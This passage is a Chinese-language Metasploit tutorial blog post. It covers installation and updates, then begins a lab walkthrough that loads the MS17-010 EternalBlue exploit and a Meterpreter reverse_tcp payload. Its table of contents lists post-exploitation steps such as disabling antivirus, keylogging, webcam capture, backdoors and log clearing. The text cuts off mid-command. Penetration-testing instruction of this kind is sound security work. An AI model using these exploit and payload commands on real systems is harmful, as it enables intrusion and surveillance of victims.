<!DOCTYPE html><html lang="zh"><head><script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script><link href="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="baidu-site-verification" content="codeva-hHAetH9ivO"><meta name="description" content="Metasploit Framework 实验环境 简介 Metasploit 的安装和更新升级 一键安装MSF MSF 的更新升级 非 kali 环境下更新升级 MSF kali 环境下更新升级 MSF     使用方法 基础使用 MSF 中加载自定义的 exploit 模块 漏洞利用 (exploit) 攻击载荷 (payload)4.1 payload 模块路径4.2 Metasploit"><meta property="og:type" content="article"><meta property="og:title" content="MSF使用教程"><meta property="og:url" content="https://zerospace.dev/posts/2f26ee9c/"><meta property="og:site_name" content="AsZero"><meta property="og:description" content="Metasploit Framework 实验环境 简介 Metasploit 的安装和更新升级 一键安装MSF MSF 的更新升级 非 kali 环境下更新升级 MSF kali 环境下更新升级 MSF     使用方法 基础使用 MSF 中加载自定义的 exploit 模块 漏洞利用 (exploit) 攻击载荷 (payload)4.1 payload 模块路径4.2 Metasploit"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2024-10-24T13:00:00.000Z"><meta property="article:modified_time" content="2025-01-29T12:30:12.053Z"><meta property="article:author" content="AsZer0s"><meta property="article:tag" content="Linux"><meta property="article:tag" content="安全"><meta name="twitter:card" content="summary"><link rel="shortcut icon" href="https://dimg04.tripcdn.com/images/0Z00m224x8xn2j0qq5D28.jpg"><link rel="icon" type="image/png" href="https://dimg04.tripcdn.com/images/0Z00m224x8xn2j0qq5D28.jpg" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="https://dimg04.tripcdn.com/images/0Z00m224x8xn2j0qq5D28.jpg"><title>MSF使用教程</title><script async src="https://www.googletagmanager.com/gtag/js?id=G-XBNDNN1FW1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-XBNDNN1FW1")</script><link rel="stylesheet" href="/css/style.css"><script type="text/x-mathjax-config">MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });</script><style>.pace .pace-progress{background:#1e92fb;height:3px}.pace .pace-progress-inner{box-shadow:0 0 10px #1e92fb,0 0 5px #1e92fb}.pace .pace-activity{border-top-color:#1e92fb;border-left-color:#1e92fb}</style><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML" async></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/rss.xml" title="AsZero" type="application/rss+xml"></head><script>let originalTitle=document.title,leavingTitle="我藏起来啦 (*´∇｀*)";document.addEventListener("visibilitychange",function(){document.hidden?document.title=leavingTitle:document.title=originalTitle}),window.addEventListener("beforeunload",function(){document.title=leavingTitle})</script><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" aria-label="顶部" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa-solid fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">首页</a></li><li><a href="/tags/">标签</a></li><li><a href="/tools/">工具</a></li><li><a href="/about/">关于</a></li><li><a href="/search/">搜索</a></li><li><a href="/friends/">友链</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" aria-label="上一篇" href="/posts/81f7fcf1/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" aria-label="下一篇" href="/posts/b034a3f3/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" aria-label="返回顶部" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">上一篇</span> <span id="i-next" class="info" style="display:none">下一篇</span> <span id="i-top" class="info" style="display:none">返回顶部</span> <span id="i-share" class="info" style="display:none">分享文章</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zerospace.dev/posts/2f26ee9c/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zerospace.dev/posts/2f26ee9c/&text=MSF使用教程"><i class="fab fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zerospace.dev/posts/2f26ee9c/&title=MSF使用教程"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zerospace.dev/posts/2f26ee9c/&is_video=false&description=MSF使用教程"><i class="fab fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=MSF使用教程&body=Check out this article: https://zerospace.dev/posts/2f26ee9c/"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zerospace.dev/posts/2f26ee9c/&title=MSF使用教程"><i class="fab fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zerospace.dev/posts/2f26ee9c/&title=MSF使用教程"><i class="fab fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zerospace.dev/posts/2f26ee9c/&title=MSF使用教程"><i class="fab fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zerospace.dev/posts/2f26ee9c/&title=MSF使用教程"><i class="fab fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zerospace.dev/posts/2f26ee9c/&name=MSF使用教程&description="><i class="fab fa-tumblr" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://zerospace.dev/posts/2f26ee9c/&t=MSF使用教程"><i class="fab fa-hacker-news" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit-Framework"><span class="toc-number">1.</span> <span class="toc-text">Metasploit Framework</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.2.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit-%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7"><span class="toc-number">1.3.</span> <span class="toc-text">Metasploit 的安装和更新升级</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85-MSF"><span class="toc-number">1.3.1.</span> <span class="toc-text">一键安装 MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E7%9A%84%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7"><span class="toc-number">1.3.2.</span> <span class="toc-text">MSF 的更新升级</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E-kali-%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7-MSF"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">非 kali 环境下更新升级 MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kali-%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7-MSF"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">kali 环境下更新升级 MSF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="toc-number">1.4.1.</span> <span class="toc-text">基础使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E4%B8%AD%E5%8A%A0%E8%BD%BD%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84-exploit%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.2.</span> <span class="toc-text">MSF 中加载自定义的 exploit模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-exploit"><span class="toc-number">1.4.3.</span> <span class="toc-text">漏洞利用 (exploit)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7-payload"><span class="toc-number">1.4.4.</span> <span class="toc-text">攻击载荷 (payload)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-%E6%A8%A1%E5%9D%97%E8%B7%AF%E5%BE%84"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">payload 模块路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit-%E4%B8%AD%E7%9A%84-Payload-%E6%A8%A1%E5%9D%97%E4%B8%BB%E8%A6%81%E6%9C%89%E4%BB%A5%E4%B8%8B%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">Metasploit 中的 Payload 模块主要有以下三种类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Meterpreter"><span class="toc-number">1.4.5.</span> <span class="toc-text">Meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter-%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F"><span class="toc-number">1.4.5.1.</span> <span class="toc-text">Meterpreter 是如何工作的？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter-%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">1.4.5.2.</span> <span class="toc-text">Meterpreter 的特点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS17-010-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-number">1.4.6.</span> <span class="toc-text">MS17_010 (永恒之蓝)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.6.1.</span> <span class="toc-text">查找漏洞相关模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Auxiliary%E8%BE%85%E5%8A%A9%E6%8E%A2%E6%B5%8B%E6%A8%A1%E5%9D%97-%E5%AF%B9%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.6.2.</span> <span class="toc-text">利用 Auxiliary辅助探测模块 对漏洞进行探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Exploit%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97-%E5%AF%B9%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.6.3.</span> <span class="toc-text">使用 Exploit漏洞利用模块 对漏洞进行利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload-%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.6.4.</span> <span class="toc-text">Payload 攻击载荷模块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5"><span class="toc-number">1.4.7.</span> <span class="toc-text">后渗透阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Post-%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.7.1.</span> <span class="toc-text">Post 后渗透模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E6%98%AF%E5%90%A6%E8%BF%90%E8%A1%8C%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A"><span class="toc-number">1.4.7.2.</span> <span class="toc-text">查看主机是否运行在虚拟机上</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%97%AD%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6"><span class="toc-number">1.4.7.3.</span> <span class="toc-text">关闭杀毒软件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.7.4.</span> <span class="toc-text">获取目标主机的详细信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.4.7.5.</span> <span class="toc-text">访问文件系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0-%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.7.6.</span> <span class="toc-text">上传 &#x2F; 下载文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.7.6.1.</span> <span class="toc-text">下载文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.7.6.2.</span> <span class="toc-text">上传文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.4.7.7.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.7.8.</span> <span class="toc-text">获取用户密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.4.7.9.</span> <span class="toc-text">运行程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE"><span class="toc-number">1.4.7.10.</span> <span class="toc-text">屏幕截图</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E8%B4%A6%E5%8F%B7"><span class="toc-number">1.4.7.11.</span> <span class="toc-text">创建一个新账号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">1.4.7.12.</span> <span class="toc-text">启用远程桌面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.4.7.13.</span> <span class="toc-text">键盘记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB"><span class="toc-number">1.4.7.14.</span> <span class="toc-text">进程迁移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%BD%BF%E7%94%A8%E9%94%AE%E7%9B%98%E9%BC%A0%E6%A0%87"><span class="toc-number">1.4.7.15.</span> <span class="toc-text">禁止目标主机使用键盘鼠标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%91%84%E5%83%8F%E5%A4%B4%E6%8B%8D%E7%85%A7"><span class="toc-number">1.4.7.16.</span> <span class="toc-text">用目标主机摄像头拍照</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%89%A9%E5%B1%95%E5%BA%93%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.4.7.17.</span> <span class="toc-text">常用扩展库介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#load-use-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.7.17.1.</span> <span class="toc-text">load&#x2F;use 命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#run-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.7.17.2.</span> <span class="toc-text">run 命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%8C%81%E7%BB%AD%E6%80%A7%E5%90%8E%E9%97%A8"><span class="toc-number">1.4.7.18.</span> <span class="toc-text">生成持续性后门</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E5%90%AF%E5%8A%A8"><span class="toc-number">1.4.7.18.1.</span> <span class="toc-text">启动项启动</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8"><span class="toc-number">1.4.7.18.2.</span> <span class="toc-text">服务启动</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PortFwd-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">1.4.7.19.</span> <span class="toc-text">PortFwd 端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97"><span class="toc-number">1.4.7.20.</span> <span class="toc-text">清除事件日志</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E5%B9%B6%E6%89%A7%E8%A1%8C-PowerShell-%E8%84%9A%E6%9C%AC"><span class="toc-number">1.4.8.</span> <span class="toc-text">导入并执行 PowerShell 脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD-stdapi"><span class="toc-number">1.4.9.</span> <span class="toc-text">加载 stdapi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7-Session"><span class="toc-number">1.4.10.</span> <span class="toc-text">升级 Session</span></a></li></ol></li></ol></li></ol></div></span></div><div class="content index py4"><article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle p-name" itemprop="name headline">MSF使用教程</h1><div class="meta"><span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-name" itemprop="name">AsZer0s</span>&emsp;</span><div class="postdate"><time datetime="2024-10-24T13:00:00.000Z" class="dt-published" itemprop="datePublished">2024-10-24</time></div><div class="article-tag"><i class="fa-solid fa-tag"></i> <a class="p-category" href="/tags/Linux/" rel="tag">Linux</a>, <a class="p-category" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></div></div></header><div class="content e-content" itemprop="articleBody"><h1 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a>Metasploit Framework</h1><ul><li>实验环境</li><li>简介</li><li>Metasploit 的安装和更新升级<ol><li>一键安装MSF</li><li>MSF 的更新升级<ol><li>非 kali 环境下更新升级 MSF</li><li>kali 环境下更新升级 MSF</li></ol></li></ol></li><li>使用方法<ol><li>基础使用</li><li><code>MSF</code> 中加载自定义的 <code>exploit 模块</code></li><li>漏洞利用 (exploit)</li><li>攻击载荷 (payload)<br>4.1 payload 模块路径<br>4.2 Metasploit 中的 Payload 模块主要有以下三种类型</li><li>Meterpreter<br>5.1 Meterpreter 是如何工作的？<br>5.2 Meterpreter 的特点</li><li>MS17_010 (永恒之蓝)<br>6.1 查找漏洞相关模块<br>6.2 利用 <code>Auxiliary 辅助探测模块</code> 对漏洞进行探测<br>6.3 使用 <code>Exploit 漏洞利用模块</code> 对漏洞进行利用<br>6.4 Payload 攻击载荷模块</li><li>后渗透阶段<br>7.1 Post 后渗透模块<br>7.2 查看主机是否运行在虚拟机上<br>7.3 关闭杀毒软件<br>7.4 获取目标主机的详细信息<br>7.5 访问文件系统<br>7.6 上传 &#x2F; 下载文件<br>7.6.1 下载文件<br>7.6.2 上传文件<br>7.7 权限提升<br>7.8 获取用户密码<br>7.9 运行程序<br>7.11 屏幕截图<br>7.12 创建一个新账号<br>7.13 启用远程桌面<br>7.14 键盘记录<br>7.15 进程迁移<br>7.16 禁止目标主机使用键盘鼠标<br>7.17 用目标主机摄像头拍照<br>7.18 常用扩展库介绍<br>7.18.1 load&#x2F;use 命令<br>7.18.2 run 命令<br>7.19 生成持续性后门<br>7.19.1 启动项启动<br>7.19.2 服务启动<br>7.20 portfwd 端口转发<br>7.21 清除事件日志</li><li>导入并执行 PowerShell 脚本</li><li>加载 stdapi</li><li>升级 Session</li></ol></li></ul><hr><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote><p>靶机<br>Windows10<br>192.168.100.158</p></blockquote><blockquote><p>攻击机<br>Linux Kali<br>192.168.100.132</p></blockquote><hr><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Metasploit Framework(MSF) 是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新<br>Metasploit 可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程<br>被安全社区冠以 “可以黑掉整个宇宙” 之名<br>刚开始的 Metasploit 是采用 Perl 语言编写的，但是再后来的新版中，改成了用 Ruby 语言编写<br>在 kali 中，自带了 Metasploit 工具<br>我们接下来以大名鼎鼎的永恒之蓝 MS17_010 漏洞为切入点，讲解 MSF 框架的使用</p><hr><h2 id="Metasploit-的安装和更新升级"><a href="#Metasploit-的安装和更新升级" class="headerlink" title="Metasploit 的安装和更新升级"></a>Metasploit 的安装和更新升级</h2><h3 id="一键安装-MSF"><a href="#一键安装-MSF" class="headerlink" title="一键安装 MSF"></a>一键安装 MSF</h3><blockquote><p>在一般的 linux 中，默认是不安装 MSF 的<br>以下是在非 kali 的 Linux 下安装 MSF 框架</p></blockquote><p>所需命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一键安装MSF：</span></span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; <span class="built_in">chmod</span> 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"> </span><br><span class="line">adduser msf                           <span class="comment">#添加msf用户</span></span><br><span class="line">su msf                                <span class="comment">#切换到msf用户</span></span><br><span class="line"><span class="built_in">cd</span>  /opt/metasploit-framework/bin     <span class="comment">#切换到msf所在的目录</span></span><br><span class="line">./msfconsole                          <span class="comment">#以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#也可以将msfconsole加入到执行目录下，这样在任何目录直接msfconsole就可以了</span></span><br><span class="line"><span class="built_in">ln</span> -s /opt/metasploit-framework/bin/msfconsole /usr/bin/msfconsole</span><br><span class="line"> </span><br><span class="line"><span class="comment">#备注：</span></span><br><span class="line"><span class="comment">#初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联</span></span><br><span class="line"><span class="comment">#这也这也就是需要新建用户msf来运行metasploit的原因所在</span></span><br><span class="line"><span class="comment">#如果你一不小心手一抖，初次运行是在root用户下</span></span><br><span class="line"><span class="comment">#请使用 msfdb reinit 命令，然后使用非root用户初始化数据库   </span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 非kali环境下更新升级MSF：</span></span><br><span class="line">msfupdate							   <span class="comment"># MSF后期的升级</span></span><br><span class="line"><span class="comment"># kali环境下更新升级MSF：</span></span><br><span class="line">apt update 							   <span class="comment"># 更新安装包信息；只检查，不更新（已安装的软件包是否有可用的更新，给出汇总报告）</span></span><br><span class="line">apt upgrade 						   <span class="comment"># 更新已安装的软件包，不删除旧包</span></span><br><span class="line">apt full-upgrade					   <span class="comment"># 升级包，删除旧包</span></span><br></pre></td></tr></table></figure><hr><h3 id="MSF-的更新升级"><a href="#MSF-的更新升级" class="headerlink" title="MSF 的更新升级"></a>MSF 的更新升级</h3><h4 id="非-kali-环境下更新升级-MSF"><a href="#非-kali-环境下更新升级-MSF" class="headerlink" title="非 kali 环境下更新升级 MSF"></a>非 kali 环境下更新升级 MSF</h4><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfupdate  <span class="comment">#MSF后期更新升级</span></span><br></pre></td></tr></table></figure><h4 id="kali-环境下更新升级-MSF"><a href="#kali-环境下更新升级-MSF" class="headerlink" title="kali 环境下更新升级 MSF"></a>kali 环境下更新升级 MSF</h4><blockquote><p>由于 kali 中的 Metasploit 渗透测试框架是集成在系统中的<br>不是单独安装，不支持使用 msfupdate 命令更新<br>更新的话需要随系统程序更新</p></blockquote><p>使用 msfupdate 命令会出现下面的情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/desktop]</span><br><span class="line">└─# msfupdate</span><br><span class="line">msfupdate is no longer supported when Metasploit is part of the operating</span><br><span class="line">system. Please use <span class="string">&#x27;apt update; apt install metasploit-framework&#x27;</span></span><br></pre></td></tr></table></figure><p>在 kali 中更新 MSF 使用以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt update 					<span class="comment"># 更新安装包信息；只检查，不更新（已安装的软件包是否有可用的更新，给出汇总报告）</span></span><br><span class="line">apt upgrade 				<span class="comment"># 更新已安装的软件包，不删除旧包；</span></span><br><span class="line">apt full-upgrade			<span class="comment"># 升级包，删除旧包</span></span><br></pre></td></tr></table></figure><p>使用上面命令，是在更新系统程序的同时，把 MSF 更新</p><hr><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole										    <span class="comment">#进入框架</span></span><br><span class="line">search  ms17_010                                    <span class="comment"># 使用search命令查找相关漏洞</span></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue        <span class="comment"># 使用use进入模块</span></span><br><span class="line">info     										    <span class="comment">#使用info查看模块信息</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp    	<span class="comment">#设置攻击载荷</span></span><br><span class="line">show options    									<span class="comment">#查看模块需要配置的参数</span></span><br><span class="line"><span 